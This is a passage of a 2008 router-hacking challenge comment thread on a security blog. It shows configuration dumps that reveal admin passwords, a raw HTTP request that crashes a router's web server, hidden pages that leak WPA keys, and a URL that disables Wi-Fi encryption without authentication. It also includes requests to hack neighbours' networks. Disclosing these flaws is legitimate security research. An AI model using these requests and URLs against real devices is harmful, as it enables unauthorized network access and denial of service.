+Config.bin we can view the administrative user name and password, external and internal IPs, router name, available service configurations, and so on.
+It becomes more interesting when the device is not left in default mode as more information is available pertaining to what is and isn't left on. The
+firmware seems to come from a company named Intoto, <a href="http://www.intoto.com/company.shtml" rel="nofollow">http://www.intoto.com/company.shtml</a>.
+
+Here is a dump of Config.bin using the default settings:
+
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+WANIPConn1
+----
+admin
+admin
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP                                                                                                                 
+
+I should mention that the external IP was available to me when I dumped Config.bin after making some changes in the Web interface. By default, it is not
+viewable. Here the admin password is 'asdf':
+
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+6868.87.85.98;68.87.69.146
+httpSharenet
+httpSubnet
+hshsd1.co.comcast.net.
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+x.x.x.x -- external IP now exists!
+WANIPConn1
+admin
+asdf
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115725">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f556deeff7d35483da58a973d49d5fca?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.ikkisoft.com/' rel='external nofollow' class='url'>ikki</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115725">
+			February 27, 2008 at 6:23 pm</a>		</div>
+
+		<pre><code>Hi,
+
+I've just read this post. Several weeks ago, I published an advisory regarding a Wifi AP vulnerability. Basically it is possible to overwrite the "admin" password in memory, thus allowing an attacker to gain access to the web interface and alter configuration parameters.
+
+Here you have the full text: <a href="http://www.ikkisoft.com/stuff/SN-2007-02.txt" rel="nofollow">http://www.ikkisoft.com/stuff/SN-2007-02.txt</a>
+
+Cheers,
+Luca "ikki"</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115727">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115727">
+			February 27, 2008 at 9:40 pm</a>		</div>
+
+		<p>10x ikki</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-115758">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115758">
+			March 1, 2008 at 10:43 pm</a>		</div>
+
+		<div class="message">the router hacking challenge is over. however, keep posting your findings as you will a deserved place among all participants.</div>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115759">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115759">
+			March 1, 2008 at 11:18 pm</a>		</div>
+
+		<p>Here is a quick summary, in no particular order, of the types of<br />
+vulnerabilities we are exhibiting:</p>
+<ul>
+<li>authentication bypass</li>
+<li>a-to-c attacks</li>
+<li>csrf (cross-site request forgeries)</li>
+<li>xss (cross-site scripting)</li>
+<li>call-jacking &#8211; like making your phone dial numbers or even survey room&#8217;s sound where the phone resides</li>
+<li>obfuscation/encryption deficiencies</li>
+<li>UPnP, DHCP and mDNS problems &#8211; although not officially reported, most devices are affected</li>
+<li>SNMP injection attacks due to poor SNMP creds.</li>
+<li>memory overwrites &#8211; well it is possible to overwrite the admin password while being in memory and therefore be able to login as admin</li>
+<li>stealing config files</li>
+<li>cross-file upload attacks &#8211; this is within the group of csrf attacks</li>
+<li>remote war-driving &#8211; way cool</li>
+<li>factory restore attacks</li>
+<li>information disclosure</li>
+<li>etc, etc, etc</li>
+</ul>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115763">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7dc5ca2fa9e7b0c59c9eac93cb6ef58a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">laurent</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115763">
+			March 2, 2008 at 7:27 am</a>		</div>
+
+		<pre><code>Hi guys. I hope it's not to late! I saw the challenge tonight ... got a look at my old dlink DI-524 and it's pretty sensible ...
+the login is vulnerable to a local bof , by supplying 4096 chars to the username field. also a large http header with no value crash
+the webserver.
+
+i have also another wi-fi router siemens speedstream 6520 , these are pretty popular in north america. a quick look at it, tells that
+there's a local DoS without login required.
+
+Site: 192.168.2.1
+Port: 80
+SSL: No
+
+POST /basehelp_English.htm HTTP/1.1
+Host: 192.168.2.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; Bob)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Content-Length: 99999999999
+Referer: <a href="http://192.168.2.1/navbar.htm" rel="nofollow">http://192.168.2.1/navbar.htm</a>
+
+If you make a POST request with no value and a content-length with a 99999999999 value , the webserver will deadly crash.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115765">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115765">
+			March 2, 2008 at 8:47 am</a>		</div>
+
+		<p>laurent, it is never too late to submit your findings on this page. thanks for the info. btw, have you JTAGed the device?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115784">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a530cd7a21b37ae7b483f86155334bfc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">perpetualmotionuk</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115784">
+			March 3, 2008 at 9:40 am</a>		</div>
+
+		<p>No Netgear router hacks yet?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115802">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/fecd22570e6ce6a378574e42acc80110?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">bug</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115802">
+			March 3, 2008 at 4:44 pm</a>		</div>
+
+		<p>Adrian you wrote: &#8220;Just make the XSS payload use the XHR() function to scrape â€˜/blah.cfgâ€™ and send it to the attackerâ€™s site.&#8221; How is it possible?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115837">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/1df663ff3acd14a0dbed73fb65431ff2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">c0redump</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115837">
+			March 4, 2008 at 12:43 pm</a>		</div>
+
+		<p>I got a few Netgear router hax innit, will post more info at some point.  kthnx.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115838">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115838">
+			March 4, 2008 at 12:45 pm</a>		</div>
+
+		<p>10x, that will be very, very helpful.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115840">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bf987971a8ee340c958c9dfd1c12ec5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://swbae.egloos.com/1701135' rel='external nofollow' class='url'>opt9</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115840">
+			March 4, 2008 at 1:15 pm</a>		</div>
+
+		<pre><code>Hi, there.
+Sorry for my late submit and poor english.
+
+I wrote the article about WRT54G v7 multiple vulnerabilities in korean at my blog  (2008-1-21 KST).
+
+my blog : <a href="http://swbae.egloos.com/1701135" rel="nofollow">http://swbae.egloos.com/1701135</a>
+
+I'll explain it for you in english.
+
+test hardware : WRT54G v7
+test firmware version : v7.00.1 (default firmware)
+
+vuln 1. FTP server no authentication.
+you can connect your wrt54g router with any id/pw combination.
+
+------
+$ ftp 192.168.1.1
+Connected to 192.168.1.1.
+220 VxWorks (VxWorks5.4.2) FTP server ready
+Name (192.168.1.1:Administrator): anyid
+331 Password required
+Password: anypass
+230 User logged in
+ftp&gt; bin
+200 Type set to I, binary mode
+ftp&gt; ls
+200 Port set okay
+150 Opening ASCII mode data connection
+  size          date       time       name
+--------       ------     ------    --------
+  956756    Jan-01-2003  02:13:12   ap61.sys
+  224664    Jan-01-2003  02:13:24   igwhtm.dat
+   28528    Jan-01-2003  02:13:26   langpak_en
+   31440    Feb-11-2008  03:22:00   igwpricf.dat
+    3690    Jun-14-2007  00:36:30   nvram.cfg
+    2046    Dec-24-2001  00:02:42   calibra.dat
+
+WARNING! 9 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete
+------
+
+vuln 2. WRT54G hidden manage pages.
+There are many numbers of hidden backdoor manage pages.
+if you want to connect, you must connect with admin privileges.
+
+<a href="http://192.168.1.1/sysinfo.htm" rel="nofollow">http://192.168.1.1/sysinfo.htm</a> &lt;-- info of your router
+<a href="http://192.168.1.1/Cysaja.htm" rel="nofollow">http://192.168.1.1/Cysaja.htm</a>  &lt;-- info of your router
+<a href="http://192.168.1.1/lastpassword.htm" rel="nofollow">http://192.168.1.1/lastpassword.htm</a> &lt;-- admin's password in plain text
+<a href="http://192.168.1.1/wlaninfo.htm" rel="nofollow">http://192.168.1.1/wlaninfo.htm</a> &lt;-- your WPA_PSK in plain text
+
+vuln 3. System information leak.
+igwpricf.dat : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+nvram.cfg    : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+/mem/pricf/0 : system informations (admin id/pw, WPA-PSK, WEP key, etc).
+
+if you want to detail, plz visit <a href="http://swbae.egloos.com/1701135" rel="nofollow">http://swbae.egloos.com/1701135</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115856">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/eb82153aa9a3ecc563cddfed8d5b49f0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jody</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115856">
+			March 4, 2008 at 11:05 pm</a>		</div>
+
+		<p>Thanks to everyone for their contributions on this. As a lowly sys-admin I&#8217;m a bit shocked by the implications here. At first I wondered if the attacks were only possible from the private side but once I slapped my forehead I realized it didn&#8217;t really matter. Has anyone tabulated the results submitted so far? I&#8217;m always asked about what model router I would recommend and it is clear I have to dig through these results and make some comparisons before I can recommend any of them.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115921">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ae55b1de2e2df02045845c9997c31277?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://vx.netlux.org/wargamevx' rel='external nofollow' class='url'>WarGame</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115921">
+			March 5, 2008 at 2:57 pm</a>		</div>
+
+		<p>My finding: <a href="http://vx.netlux.org/wargamevx/alice_gate2_pluswifi_PoC.zip" rel="nofollow">http://vx.netlux.org/wargamevx.....fi_PoC.zip</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115922">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115922">
+			March 5, 2008 at 3:03 pm</a>		</div>
+
+		<p>WarGame, can you post a quick summary of your findings. That way more people will be interested to see what is behind this ZIP file :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115928">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ae55b1de2e2df02045845c9997c31277?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://vx.netlux.org/wargamevx' rel='external nofollow' class='url'>WarGame</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115928">
+			March 5, 2008 at 5:22 pm</a>		</div>
+
+		<pre><code>Discovered by WarGame/DoomRiderz
+HomePage: <a href="http://vx.netlux.org/wargamevx" rel="nofollow">http://vx.netlux.org/wargamevx</a>
+mail addr: <a href="mailto:wargame89@yahoo.it">wargame89@yahoo.it</a>
+Vulnerable device: Alice gate 2 plus wifi
+Vendor's page: <a href="http://aiuto.alice.it/informazioni/modemadsl/alice_gate2adv.html" rel="nofollow">http://aiuto.alice.it/informaz.....e2adv.html</a>
+
+It seems to be possible to disable the wifi encryption using the following url:
+<a href="http://192.168.1.1/cp06_wifi_m_nocifr.cgi?wlChannel=Auto&amp;wlRadioEnable=on" rel="nofollow">http://192.168.1.1/cp06_wifi_m.....oEnable=on</a> 
+
+This can be done because there is no authentication scheme to access the admin panel of the modem,
+everyone can access it.
+
+Common scenario:
+The attacker sends to the victim (using emails, IM or IRC) the malicious link and with some social techs
+makes the victim click on it.
+After this, the attacker can access the victim's wlan that is now open to everybody.
+Other devices of the same family could be vulnerable too but I did not test it.
+
+(Sorry for the poor english :) )</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-116031">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116031">
+			March 7, 2008 at 11:38 am</a>		</div>
+
+		<p>As we can all see, there are MANY SOHO routers vulnerable to authentication bypass issues. For those who have no clue how to find them, check out the following GNUCITIZEN posts:</p>
+<p><a href="../holes-in-embedded-devices-authentication-bypass-pt-1/index.html" rel="nofollow">http://www.gnucitizen.org/blog.....pass-pt-1/</a><br />
+<a href="../holes-in-embedded-devices-authentication-bypass-pt-2/index.html" rel="nofollow">http://www.gnucitizen.org/blog.....pass-pt-2/</a><br />
+<a href="../holes-in-embedded-devices-authentication-bypass-pt-3/index.html" rel="nofollow">http://www.gnucitizen.org/blog.....pass-pt-3/</a><br />
+<a href="../holes-in-embedded-devices-authentication-bypass-pt-4/index.html" rel="nofollow">http://www.gnucitizen.org/blog.....pass-pt-4/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-116033">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6220fdcf3d124e28d19e9f8cebe02ee8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kroli86.ilive.ro/' rel='external nofollow' class='url'>kroli86</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116033">
+			March 7, 2008 at 12:29 pm</a>		</div>
+
+		<p>hy, i am in spain. I have 1 wireless unlocked. and other 10 locked. How can i unlock them? i think some rooter have key at back, if i know the mac can somebody tell me the password?</p>
+<p>I want to hack JAzztel and Moviestar.</p>
+<p><a href="http://i119.photobucket.com/albums/o160/kroli86/mac.jpg" rel="nofollow">http://i119.photobucket.com/al.....86/mac.jpg</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-116205">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2174a263052988e6b62a87944b481513?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">get'er_done</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116205">
+			March 11, 2008 at 10:53 pm</a>		</div>
+
+		<p>This isn&#8217;t new and it isn&#8217;t necessarily a hack for Netgear routers but it does provide a backdoor to certain newer Netgear routers.  Netgear has an internal program for developers that has been leaked to the public to allow a &#8220;Telnet Console&#8221; for developers.  This opens up the router for someone to telnet into the router with a default username and password.  What is scary is that it allows admin privileges to the router and the ability to view the username and password of the web interface in plain text.  I have found that the &#8220;Telnet Console&#8221; is disabled every time a new change is made via the web interface or a router reboot. I have personally done this on my own Netgear router. </p>
+<p>Here are some links for the info:<br />
+<a href="http://www.seattlewireless.net/index.cgi/NetgearWGR614" rel="nofollow">http://www.seattlewireless.net.....gearWGR614</a><br />
+<a href="http://wiki.openwrt.org/OpenWrtDocs/Hardware/Netgear/TelnetConsole" rel="nofollow">http://wiki.openwrt.org/OpenWr.....netConsole</a><br />
+<a href="http://blog.ktdreyer.com/2008/01/hacking-wgr614.html" rel="nofollow">http://blog.ktdreyer.com/2008/.....gr614.html</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-116357">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://nexact.net/' rel='external nofollow' class='url'>nex</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116357">
+			March 14, 2008 at 1:44 pm</a>		</div>
+
+		<p>be really careful when you report a vulnerability, there&#8217;s a chance that someone else steal your credit by reporting it to SecurityFocus&#8230; Arthur Lashin just stole mine.</p>
+<p><a href="http://www.securityfocus.com/bid/28122/info" rel="nofollow">http://www.securityfocus.com/bid/28122/info</a><br />
+<a href="http://www.kb.cert.org/vuls/id/248372" rel="nofollow">http://www.kb.cert.org/vuls/id/248372</a></p>
+<p>The vendor is aware since 2007-10-15 and issued me a ticketnumber.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-116359">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116359">
+			March 14, 2008 at 2:44 pm</a>		</div>
+
+		<p>that kind of sux, can you prove it. you could either send a response to his email or leave it be as you might not find it worthed to fight things like that.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-116361">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://nexact.net/' rel='external nofollow' class='url'>nex</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116361">
+			March 14, 2008 at 2:50 pm</a>		</div>
+
+		<p>i can prove it. i send an email to USCERT / Securityfocus / him. waiting for news.. thats why i&#8217;m never publishing 0days, ppl ripping credits. hehe.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-116362">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116362">
+			March 14, 2008 at 3:02 pm</a>		</div>
+
+		<p>it really depends what your intentions are :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-116384">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ac64c62241943de4a9312244da82ca50?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.nexact.net/' rel='external nofollow' class='url'>nex</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116384">
+			March 15, 2008 at 1:11 am</a>		</div>
+
+		<p>woot. my name has been added into credits. i guess i won.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-116409">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116409">
+			March 15, 2008 at 8:49 am</a>		</div>
+
+		<p>excellent news, glad that this has been resolved.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-116421">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f9cf3cec66f290665ce93f3348bf3c4c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.freewenbs.com/beccamcd125' rel='external nofollow' class='url'>rebecca</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116421">
+			March 15, 2008 at 1:21 pm</a>		</div>
+
+		<p>i dont have a wireless router all i want to do is hack my neighbours router i need the password to his router</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-117449">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0808e465afcddf24dcea0b5b127fee05?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://klo-2k.spaces.live.com/' rel='external nofollow' class='url'>klo</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-117449">
+			March 26, 2008 at 5:12 am</a>		</div>
+
+		<pre><code>I can confirm I can make the DI-624 reboot by supplying a username / password string of &gt;298 characters long,
+or a combination of the two that adds up to &gt;298 characters, from the authentication dialogue box.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-117467">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-117467">
+			March 26, 2008 at 8:45 am</a>		</div>
+
+		<p>what I believe it was happening is that you have crashed the a CGI script or the actual HTTP server which upon exit informed the system to reboot. this is a very common behavior among embedded devices. when you see an embedded device rebooting it is definitely because you caused something to do what it was not supposed/designed to &#8211; mostly stack, heap overflows. it is not very clear from your post but are you saying that the payload has to be 298+ characters long?</p>
